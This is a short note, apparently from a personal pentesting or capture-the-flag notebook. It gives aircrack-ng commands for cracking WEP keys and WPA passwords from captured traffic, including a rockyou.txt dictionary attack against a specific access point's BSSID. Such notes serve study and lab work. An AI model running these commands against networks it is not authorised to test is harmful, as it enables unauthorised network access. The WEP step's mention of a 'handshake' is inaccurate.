# Wi-Fi Cracking

# WEP

1. Capture the handshake via Wireshark

```
aircrack-ng filename

```

2. Run the command above and the password is cracked

# WPA

1. Capture handshake via Wireshark

```

aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C0:4A:00:80:76:E4 PCAP3.cap

```

2. Run the above command and the password is cracked

-b C0:4A:00:80:76:E4 Breakdown: The -b flag specifies the BSSID (MAC address) of the target access point you want to attack.

The BSSID is unique to each access point, so it helps Aircrack-ng focus on cracking only the packets associated with that specific network.
